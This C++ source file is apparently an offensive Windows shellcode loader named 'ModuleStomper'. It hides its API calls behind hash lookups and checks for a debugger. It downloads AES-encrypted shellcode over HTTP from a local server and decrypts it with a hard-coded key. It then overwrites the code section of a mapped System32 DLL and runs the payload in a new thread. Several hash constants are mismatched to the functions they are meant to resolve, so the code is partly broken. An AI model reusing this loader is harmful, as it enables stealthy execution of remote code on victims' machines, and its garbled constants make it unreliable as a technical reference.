#pragma once
#define _WIN32_WINNT 0x0A00
#define WINVER 0x0A00
#define NTDDI_VERSION NTDDI_WIN10

#include <windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <memory>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

struct ApiHashes {
    const uint64_t NtCreateSection = 0x5c5c1d2d41f79956;
    const uint64_t NtMapViewOfSection = 0x4d97f3d4a3932dd2;
    const uint64_t NtProtectVirtualMemory = 0x7946c61b8a16a9dd;
    const uint64_t NtCreateThreadEx = 0x8a9cd55872e7e981;
    const uint64_t NtWaitForSingleObject = 0x4f944f2d28e31b51;
    const uint64_t NtClose = 0x40d6e69c1dd3e282;
    const uint64_t NtUnmapViewOfSection = 0x6aa412e87b7d3358;
    const uint64_t NtQueryInformationThread = 0x1cba4d605282c45a;
    const uint64_t BCryptOpenAlgorithmProvider = 0x9b3d85a14a535e79;
    const uint64_t BCryptSetProperty = 0x2c59b9bb9be72927;
    const uint64_t BCryptGenerateSymmetricKey = 0x9c2bfadfc6321a86;
    const uint64_t BCryptDecrypt = 0x4b9f01cba4940f93;
    const uint64_t WinHttpOpen = 0x4fd8c3d7ae3476a2;
    const uint64_t WinHttpConnect = 0x3bdc7dae4bb5ae71;
    const uint64_t WinHttpOpenRequest = 0x7d7735d977168da3;
    const uint64_t WinHttpSendRequest = 0x9c6d6c2c2416af6b;
    const uint64_t WinHttpReceiveResponse = 0x1cf0bc476c3441a8;
    const uint64_t WinHttpQueryDataAvailable = 0x2f3d3c24a519c61b;
    const uint64_t WinHttpReadData = 0x7c6c2c2416af6b9c;
};

typedef NTSTATUS(NTAPI* PFN_NTCREATESECTION)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PLARGE_INTEGER MaximumSize,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN OPTIONAL HANDLE FileHandle);

typedef NTSTATUS(NTAPI* PFN_NTMAPVIEWOFSECTION)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect);

typedef NTSTATUS(NTAPI* PFN_NTPROTECTVIRTUALMEMORY)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

typedef NTSTATUS(NTAPI* PFN_NTCREATETHREADEX)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN OPTIONAL PVOID Argument,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN OPTIONAL PVOID AttributeList);

struct SectionInfo {
    PVOID baseAddress;
    SIZE_T size;
    bool isValid;
    SectionInfo() : baseAddress(nullptr), size(0), isValid(false) {}
};

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

class DInvoke {
private:
    static uint64_t HashString(const char* str) {
        uint64_t hash = 0;
        while (*str) {
            hash = ((hash << 5) + hash) + (uint64_t)*str++;
            hash = hash & 0xFFFFFFFFFFFFFFFF;
        }
        return hash;
    }

    static PVOID GetModuleBaseByHash(uint64_t moduleHash) {
#ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
#else
        PPEB peb = (PPEB)__readfsdword(0x30);
#endif
        PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        while (curr != head) {
            PLDR_DATA_TABLE_ENTRY dte = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            UNICODE_STRING baseDllName = *(PUNICODE_STRING)((PBYTE)dte + 0x58);

            char asciiName[256] = { 0 };
            for (USHORT i = 0; i < baseDllName.Length / 2 && i < 255; i++) {
                asciiName[i] = (char)baseDllName.Buffer[i];
            }

            if (HashString(asciiName) == moduleHash) {
                return dte->DllBase;
            }
            curr = curr->Flink;
        }
        return nullptr;
    }

    static PVOID GetFunctionByHash(PVOID moduleBase, uint64_t functionHash) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + dosHeader->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase +
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        PDWORD functions = (PDWORD)((PBYTE)moduleBase + exportDir->AddressOfFunctions);
        PDWORD names = (PDWORD)((PBYTE)moduleBase + exportDir->AddressOfNames);
        PWORD ordinals = (PWORD)((PBYTE)moduleBase + exportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            char* functionName = (char*)moduleBase + names[i];
            if (HashString(functionName) == functionHash) {
                return (PVOID)((PBYTE)moduleBase + functions[ordinals[i]]);
            }
        }
        return nullptr;
    }

public:
    static PVOID GetFunction(uint64_t moduleHash, uint64_t functionHash) {
        PVOID moduleBase = GetModuleBaseByHash(moduleHash);
        if (!moduleBase) return nullptr;
        return GetFunctionByHash(moduleBase, functionHash);
    }
};

class SecurityCheck {
private:
    const uint64_t NTDLL_HASH = 0x3CFA685D;

    bool IsDebugged() {
        auto ntQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))
            DInvoke::GetFunction(NTDLL_HASH, 0x8A9CD55872E7E981);

        DWORD isDebuggerPresent = 0;
        if (NT_SUCCESS(ntQueryInformationProcess(GetCurrentProcess(),
            (PROCESSINFOCLASS)7, &isDebuggerPresent, sizeof(DWORD), NULL))) {
            return isDebuggerPresent != 0;
        }
        return false;
    }

public:
    bool IsSafeEnvironment() {
        if (IsDebugged()) return false;
        return true;
    }
};

class CryptoManager {
private:
    const std::string KEY = "ModuleStomping2024";
    const std::string IV = "1234567890123456";
    BCRYPT_ALG_HANDLE hAesAlg;
    BCRYPT_KEY_HANDLE hKey;
    const uint64_t BCRYPT_HASH = 0x7BF9CADC;

    ApiHashes hashes;

public:
    CryptoManager() : hAesAlg(NULL), hKey(NULL) {}

    ~CryptoManager() {
        if (hKey) {
            auto BCryptDestroyKey = (NTSTATUS(NTAPI*)(BCRYPT_KEY_HANDLE))
                DInvoke::GetFunction(BCRYPT_HASH, 0x9B3D85A14A535E79);
            if (BCryptDestroyKey) BCryptDestroyKey(hKey);
        }
        if (hAesAlg) {
            auto BCryptCloseAlgorithmProvider = (NTSTATUS(NTAPI*)(BCRYPT_ALG_HANDLE, ULONG))
                DInvoke::GetFunction(BCRYPT_HASH, 0x2C59B9BB9BE72927);
            if (BCryptCloseAlgorithmProvider)
                BCryptCloseAlgorithmProvider(hAesAlg, 0);
        }
    }

    bool Initialize() {
        auto BCryptOpenAlgorithmProvider = (NTSTATUS(NTAPI*)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG))
            DInvoke::GetFunction(BCRYPT_HASH, hashes.BCryptOpenAlgorithmProvider);

        if (!BCryptOpenAlgorithmProvider) return false;

        NTSTATUS status = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
        if (!NT_SUCCESS(status)) return false;

        auto BCryptSetProperty = (NTSTATUS(NTAPI*)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG))
            DInvoke::GetFunction(BCRYPT_HASH, hashes.BCryptSetProperty);

        if (!BCryptSetProperty) return false;

        status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE,
            (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        if (!NT_SUCCESS(status)) return false;

        BYTE key[32] = { 0 };
        memcpy(key, KEY.c_str(), min(KEY.length(), sizeof(key)));

        auto BCryptGenerateSymmetricKey = (NTSTATUS(NTAPI*)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*,
            PUCHAR, ULONG, PUCHAR, ULONG, ULONG))
            DInvoke::GetFunction(BCRYPT_HASH, hashes.BCryptGenerateSymmetricKey);

        if (!BCryptGenerateSymmetricKey) return false;

        status = BCryptGenerateSymmetricKey(hAesAlg, &hKey, NULL, 0, key, 32, 0);
        return NT_SUCCESS(status);
    }

    std::vector<uint8_t> Decrypt(const std::vector<uint8_t>& encrypted_data) {
        if (encrypted_data.size() < 16) return std::vector<uint8_t>();

        std::vector<BYTE> iv(encrypted_data.begin(), encrypted_data.begin() + 16);
        std::vector<BYTE> ciphertext(encrypted_data.begin() + 16, encrypted_data.end());
        ULONG cbPlaintext = 0;

        auto BCryptDecrypt = (NTSTATUS(NTAPI*)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID,
            PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG))
            DInvoke::GetFunction(BCRYPT_HASH, hashes.BCryptDecrypt);

        if (!BCryptDecrypt) return std::vector<uint8_t>();

        NTSTATUS status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(),
            NULL, iv.data(), (ULONG)iv.size(), NULL, 0, &cbPlaintext, BCRYPT_BLOCK_PADDING);
        if (!NT_SUCCESS(status)) return std::vector<uint8_t>();

        std::vector<uint8_t> plaintext(cbPlaintext);
        status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(),
            NULL, iv.data(), (ULONG)iv.size(), plaintext.data(), cbPlaintext,
            &cbPlaintext, BCRYPT_BLOCK_PADDING);

        return NT_SUCCESS(status) ? plaintext : std::vector<uint8_t>();
    }
};

class HttpClient {
private:
    HINTERNET hSession, hConnect, hRequest;
    struct {
        LPCWSTR host = L"localhost";
        LPCWSTR path = L"/shellcode";
        INTERNET_PORT port = 8080;
        LPCWSTR userAgent = L"Module Stomper/1.0";
    } config;
    const uint64_t WINHTTP_HASH = 0x4A35E79B;
    ApiHashes hashes;

public:
    HttpClient() : hSession(NULL), hConnect(NULL), hRequest(NULL) {}

    ~HttpClient() {
        if (hRequest) {
            auto WinHttpCloseHandle = (BOOL(WINAPI*)(HINTERNET))
                DInvoke::GetFunction(WINHTTP_HASH, 0x8B4A35E7);
            if (WinHttpCloseHandle) WinHttpCloseHandle(hRequest);
        }
        if (hConnect) {
            auto WinHttpCloseHandle = (BOOL(WINAPI*)(HINTERNET))
                DInvoke::GetFunction(WINHTTP_HASH, 0x8B4A35E7);
            if (WinHttpCloseHandle) WinHttpCloseHandle(hConnect);
        }
        if (hSession) {
            auto WinHttpCloseHandle = (BOOL(WINAPI*)(HINTERNET))
                DInvoke::GetFunction(WINHTTP_HASH, 0x8B4A35E7);
            if (WinHttpCloseHandle) WinHttpCloseHandle(hSession);
        }
    }

    bool Initialize() {
        auto WinHttpOpen = (HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))
            DInvoke::GetFunction(WINHTTP_HASH, hashes.WinHttpOpen);

        if (!WinHttpOpen) return false;

        hSession = WinHttpOpen(config.userAgent, WINHTTP_ACCESS_TYPE_NO_PROXY,
            NULL, NULL, 0);
        if (!hSession) return false;

        auto WinHttpConnect = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD))
            DInvoke::GetFunction(WINHTTP_HASH, hashes.WinHttpConnect);

        if (!WinHttpConnect) return false;

        hConnect = WinHttpConnect(hSession, config.host, config.port, 0);
        return hConnect != NULL;
    }

    std::vector<uint8_t> FetchShellcode() {
        std::vector<uint8_t> response;

        auto WinHttpOpenRequest = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR,
            LPCWSTR, LPCWSTR, LPCWSTR*, DWORD))
            DInvoke::GetFunction(WINHTTP_HASH, hashes.WinHttpOpenRequest);

        if (!WinHttpOpenRequest) return response;

        hRequest = WinHttpOpenRequest(hConnect, L"GET", config.path, NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!hRequest) return response;

        auto WinHttpSendRequest = (BOOL(WINAPI*)(HINTERNET, LPCWSTR, DWORD, LPVOID,
            DWORD, DWORD, DWORD_PTR))
            DInvoke::GetFunction(WINHTTP_HASH, hashes.WinHttpSendRequest);

        if (!WinHttpSendRequest || !WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
            return response;

        auto WinHttpReceiveResponse = (BOOL(WINAPI*)(HINTERNET, LPVOID))
            DInvoke::GetFunction(WINHTTP_HASH, hashes.WinHttpReceiveResponse);

        if (!WinHttpReceiveResponse || !WinHttpReceiveResponse(hRequest, NULL))
            return response;

        auto WinHttpQueryDataAvailable = (BOOL(WINAPI*)(HINTERNET, LPDWORD))
            DInvoke::GetFunction(WINHTTP_HASH, hashes.WinHttpQueryDataAvailable);

        auto WinHttpReadData = (BOOL(WINAPI*)(HINTERNET, LPVOID, DWORD, LPDWORD))
            DInvoke::GetFunction(WINHTTP_HASH, hashes.WinHttpReadData);

        if (!WinHttpQueryDataAvailable || !WinHttpReadData)
            return response;

        DWORD bytesAvailable = 0;
        std::vector<BYTE> buffer(8192);

        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            DWORD bytesRead = 0;
            if (WinHttpReadData(hRequest, buffer.data(),
                min(bytesAvailable, 8192), &bytesRead)) {
                response.insert(response.end(), buffer.begin(),
                    buffer.begin() + bytesRead);
            }
        }
        return response;
    }
};

class DllManager {
private:
    HANDLE hFile;
    HANDLE hSection;
    PVOID baseAddress;
    SIZE_T viewSize;
    SectionInfo textSection;
    const uint64_t NTDLL_HASH = 0x3CFA685D;

    bool FindTextSection() {
        if (!baseAddress) return false;

        PIMAGE_DOS_HEADER dosHeader = static_cast<PIMAGE_DOS_HEADER>(baseAddress);
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;

        PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
            static_cast<BYTE*>(baseAddress) + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (memcmp(section[i].Name, ".text", 5) == 0) {
                textSection.baseAddress = static_cast<BYTE*>(baseAddress) + section[i].VirtualAddress;
                textSection.size = section[i].Misc.VirtualSize;
                textSection.isValid = true;
                return true;
            }
        }
        return false;
    }

public:
    DllManager() : hFile(INVALID_HANDLE_VALUE), hSection(NULL), baseAddress(NULL), viewSize(0) {}

    ~DllManager() {
        if (baseAddress) {
            auto ntUnmapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, PVOID))
                DInvoke::GetFunction(NTDLL_HASH, 0x4D97F3D4A3932DD2);
            if (ntUnmapViewOfSection) {
                ntUnmapViewOfSection(GetCurrentProcess(), baseAddress);
            }
        }
        if (hSection) {
            auto ntClose = (NTSTATUS(NTAPI*)(HANDLE))
                DInvoke::GetFunction(NTDLL_HASH, ApiHashes().NtClose);
            if (ntClose) {
                ntClose(hSection);
            }
        }
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
        }
    }

    bool LoadDll(const wchar_t* dllPath) {
        hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        auto ntCreateSection = (PFN_NTCREATESECTION)
            DInvoke::GetFunction(NTDLL_HASH, ApiHashes().NtCreateSection);
        if (!ntCreateSection) return false;

        NTSTATUS status = ntCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
            NULL, PAGE_READONLY, SEC_IMAGE, hFile);
        if (!NT_SUCCESS(status)) return false;

        auto ntMapViewOfSection = (PFN_NTMAPVIEWOFSECTION)
            DInvoke::GetFunction(NTDLL_HASH, ApiHashes().NtMapViewOfSection);
        if (!ntMapViewOfSection) return false;

        baseAddress = NULL;
        viewSize = 0;
        status = ntMapViewOfSection(hSection, GetCurrentProcess(), &baseAddress,
            0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY);
        if (!NT_SUCCESS(status)) return false;

        return FindTextSection();
    }

    PVOID GetTextSectionAddress() const { return textSection.baseAddress; }
    SIZE_T GetTextSectionSize() const { return textSection.size; }
    bool IsTextSectionValid() const { return textSection.isValid; }
};

class ModuleStomper {
private:
    SecurityCheck securityChecker;
    CryptoManager cryptoManager;
    std::unique_ptr<HttpClient> httpClient;
    std::unique_ptr<DllManager> dllManager;
    const uint64_t NTDLL_HASH = 0x3CFA685D;

    bool ValidateShellcode(const std::vector<uint8_t>& shellcode) {
        if (!dllManager->IsTextSectionValid()) return false;
        if (shellcode.empty()) return false;
        if (shellcode.size() > dllManager->GetTextSectionSize()) return false;
        return true;
    }

    bool WriteShellcode(const std::vector<uint8_t>& shellcode) {
        PVOID baseAddr = dllManager->GetTextSectionAddress();
        SIZE_T regionSize = shellcode.size();
        ULONG oldProtect;

        auto ntProtectVirtualMemory = (PFN_NTPROTECTVIRTUALMEMORY)
            DInvoke::GetFunction(NTDLL_HASH, ApiHashes().NtProtectVirtualMemory);
        if (!ntProtectVirtualMemory) return false;

        NTSTATUS status = ntProtectVirtualMemory(GetCurrentProcess(),
            &baseAddr, &regionSize, PAGE_READWRITE, &oldProtect);
        if (!NT_SUCCESS(status)) return false;

        memcpy(baseAddr, shellcode.data(), shellcode.size());

        status = ntProtectVirtualMemory(GetCurrentProcess(),
            &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
        return NT_SUCCESS(status);
    }

public:
    ModuleStomper() {
        httpClient = std::make_unique<HttpClient>();
        dllManager = std::make_unique<DllManager>();
    }

    bool Execute() {
        if (!securityChecker.IsSafeEnvironment() ||
            !cryptoManager.Initialize() ||
            !httpClient->Initialize()) return false;

        auto encryptedShellcode = httpClient->FetchShellcode();
        if (encryptedShellcode.empty()) return false;

        auto shellcode = cryptoManager.Decrypt(encryptedShellcode);
        if (shellcode.empty()) return false;

        std::wstring targetDll = L"C:\\Windows\\System32\\version.dll";
        if (!dllManager->LoadDll(targetDll.c_str())) return false;

        if (!ValidateShellcode(shellcode) || !WriteShellcode(shellcode)) return false;

        PVOID pShellcode = dllManager->GetTextSectionAddress();

        auto ntCreateThreadEx = (PFN_NTCREATETHREADEX)
            DInvoke::GetFunction(NTDLL_HASH, ApiHashes().NtCreateThreadEx);
        if (!ntCreateThreadEx) return false;

        HANDLE hThread = NULL;
        NTSTATUS status = ntCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
            GetCurrentProcess(), pShellcode, NULL, 0, 0, 0, 0, NULL);
        if (!NT_SUCCESS(status)) return false;

        auto ntWaitForSingleObject = (NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PLARGE_INTEGER))
            DInvoke::GetFunction(NTDLL_HASH, ApiHashes().NtWaitForSingleObject);
        if (!ntWaitForSingleObject) return false;

        status = ntWaitForSingleObject(hThread, FALSE, NULL);
        if (!NT_SUCCESS(status)) return false;

        BYTE exitCode = 0;
        THREAD_BASIC_INFORMATION tbi = { 0 };
        auto ntQueryInformationThread = (NTSTATUS(NTAPI*)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG))
            DInvoke::GetFunction(NTDLL_HASH, 0x1CBA4D605282C45A);
        if (ntQueryInformationThread) {
            ntQueryInformationThread(hThread, (THREADINFOCLASS)0, &tbi, sizeof(tbi), NULL);
            exitCode = (BYTE)tbi.ExitStatus;
        }

        printf("%d", exitCode);

        auto ntClose = (NTSTATUS(NTAPI*)(HANDLE))
            DInvoke::GetFunction(NTDLL_HASH, ApiHashes().NtClose);
        if (ntClose) {
            ntClose(hThread);
        }

        return true;
    }
};

int main() {
    ModuleStomper stomper;
    return stomper.Execute() ? 0 : 1;
}